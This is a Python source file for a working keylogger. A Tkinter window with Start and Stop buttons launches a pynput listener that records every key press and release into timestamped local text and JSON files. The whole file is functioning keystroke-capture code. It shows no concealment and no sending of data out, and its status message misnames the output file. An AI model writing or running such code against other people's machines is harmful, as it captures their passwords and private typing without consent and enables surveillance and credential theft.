import tkinter as tk
from tkinter import *
from pynput import keyboard
import json
import time

keys = []
flag = False
pressed_keys = ""
timestamp = str(int(time.time()))

def log_text(key):
    with open(f'key_log_{timestamp}.txt', "w+") as log_file:
        log_file.write(key)

def log_json(keys_used):
    with open(f'key_log_{timestamp}.json', '+wb') as json_log_file:
        key_list_bytes = json.dumps(keys_used).encode()
        json_log_file.write(key_list_bytes)

def on_press(key):
    global flag, keys, pressed_keys
    if flag == False:
        keys.append({'Pressed': f'{key}'})
        flag = True

    if flag == True:
        keys.append({'Held': f'{key}'})
    log_json(keys)

def on_release(key):
    global flag, keys, pressed_keys
    keys.append({'Released': f'{key}'})

    if flag == True:
        flag = False
    log_json(keys)

    pressed_keys = pressed_keys + str(key)
    log_text(str(pressed_keys))

def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'keylogger.txt'")
    start_button.config(state='disabled')
    stop_button.config(state='normal')

def stop_keylogger():
    global listener
    listener.stop()
    label.config(text="Keylogger stopped.")
    start_button.config(state='normal')
    stop_button.config(state='disabled')

root = Tk()
root.title("Keylogger")

label = Label(root, text='Click "Start" to begin keylogging.')
label.config(anchor=CENTER)
label.pack()

start_button = Button(root, text="Start", command=start_keylogger)
start_button.pack(side=LEFT)

stop_button = Button(root, text="Stop", command=stop_keylogger, state='disabled')
stop_button.pack(side=RIGHT)

root.geometry("250x250")

root.mainloop()
